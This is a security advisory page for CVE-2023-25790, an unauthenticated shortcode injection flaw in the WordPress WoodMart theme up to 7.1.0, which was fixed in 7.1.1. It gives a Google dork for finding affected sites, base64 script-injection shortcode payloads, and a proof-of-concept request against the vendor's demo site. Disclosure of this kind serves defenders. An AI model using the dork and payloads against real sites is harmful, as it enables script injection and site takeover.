---
title: WordPress WoodMart Theme < = 7.1.0 - Unauthenticated Arbitrary Shortcodes Injection
url: https://cxsecurity.com/issue/WLB-2023030021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-09
fetch_date: 2025-10-04T08:59:14.000778
---

# WordPress WoodMart Theme < = 7.1.0 - Unauthenticated Arbitrary Shortcodes Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress WoodMart Theme <= 7.1.0 - Unauthenticated Arbitrary Shortcodes Injection** **2023.03.08**  **![ru](https://cert.cx/cxstatic/images/flags/ru.png) [FearZzZz](https://cxsecurity.com/author/FearZzZz/1/) **(RU)** ![ru](https://cert.cx/cxstatic/images/flags/ru.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-25790](https://cxsecurity.com/cveshow/CVE-2023-25790/ "Click to see CVE-2023-25790")**  CWE: **[CWE-20](https://cxsecurity.com/cwe/CWE-20 "Click to see CWE-20")**  **[**Dork:** inurl:/wp-content/themes/woodmart/](https://cxsecurity.com/dorks/)** | |

==== [ Z://USB-00\_RESEARCH/WORDPRESS/ ] ============================================= [ 2022 ] ==
Report Title: WordPress WoodMart Theme <= 7.1.0 - Unauthenticated Arbitrary Shortcodes Injection
Google Dork: inurl:/wp-content/themes/woodmart/
Research Date: 2022-11-12
Researcher: FearZzZz [ https://fearzzzz.ru ]
Component Vendor: XTemos [ https://themeforest.net/user/xtemos ]
Vulnerable Version: <= 7.1.0
Component Link: https://themeforest.net/item/woodmart-woocommerce-wordpress-theme/20264492
CVSS Base Score: 8.1 (High)
CVSS Vector String: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
OWASP Top 10: A03: 2021 – Injection
CWE: CWE-20
CVE: CVE-2023-25790
=================================================================================================
#### [ Description: ]
The WoodMart premium theme for WordPress is vulnerable to Unauthenticated Arbitrary Shortcodes Injection in versions up to, and including, v7.1.0. This makes it possible for unauthenticated attackers to execute arbitrary shortcodes. Note that the default WordPress shortcodes are relatively secure but other installed plugins often include insecure shortcodes, which allows to assess the potential attack threat as "medium" or "high".
#### [ Impact: ]
Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.
Malicious PHP code execution, the ability to gain full control over the attacked website, as well as retain access through the backdoor.
#### [ Payloads: ]
][vc\_raw\_html]PHNjcmlwdD5hbGVydChgRmVhclp6WnpgKTs8L3NjcmlwdD4=[/vc\_raw\_html][audio%20
][vc\_raw\_js]PHNjcmlwdD5hbGVydChgRmVhclp6WnpgKTs8L3NjcmlwdD4=[/vc\_raw\_js][audio%20
#### [ Proof-of-Concept: ]
https://woodmart.xtemos.com/?s=][vc\_raw\_html]PHNjcmlwdD5hbGVydChgRmVhclp6WnpgKTs8L3NjcmlwdD4=[/vc\_raw\_html][audio%20&post\_type=product&product\_cat=lighting
GET /?s=][vc\_raw\_html]PHNjcmlwdD5hbGVydChgRmVhclp6WnpgKTs8L3NjcmlwdD4=[/vc\_raw\_html][audio%20&post\_type=product&product\_cat=lighting HTTP/2
Host: woodmart.xtemos.com
#### [ Timeline: ]
2022.11.12 - Vulnerability has been discovered.
2022.11.22 - Vendor notified, first contact attempt. No response.
2023.02.10 - Second attempt to contact the vendor. No response.
2023.02.13 - WoodMart Theme v7.1.0 released.
2023.02.13 - All the details was addressed to Envato and Patchstack. CVE ID requested.
2023.02.14 - Got a response from Envato, got a response from the vendor.
2023.02.14 - WoodMart Theme v7.1.1 released, the vulnerability has been fixed.
#### [ Contacts: ]
Website: fearzzzz.ru
Email: fearzzzz@tutanota.com
Twitter: https://twitter.com/fear\_zzzz
Medium: https://fearzzzz.medium.com
GitHub: https://github.com/fearzzzz
YouTube: https://youtube.com/@fearzzzz
#### [ Notes: ]
Prerequisite for successful exploitation: the "Display results from blog" option must be enabled on the target website (`&xts-woodmart-options[enqueue\_posts\_results]=1`).
Special thanks to Mikhail Kobzarev (https://t.me/mihdan | https://wp-digest.com) for providing the original theme files.
Additional greetings to Kailoon (ThemeForest Senior Reviewer, https://kailoon.com) and XTemos Studio (https://themeforest.net/user/xtemos) for the prompt response.
#### [ Disclaimer: ]
The information provided in this report is provided "as is" without warranty of any kind. FearZzZz disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall FearZzZz be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if FearZzZz have been advised of the possibility of such damages.
========================================================================== [ www.fearzzzz.ru ] ==

**##### References:**

https://raw.githubusercontent.com/fearzzzz/fearzzzz.github.io/main/vulnerability/%5B2022-11-12%5D-%5BWordPress%5D-WoodMart-Premium-Theme-v7.1.0-Unauthenticated-Arbitrary-Shortcodes-Injection.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top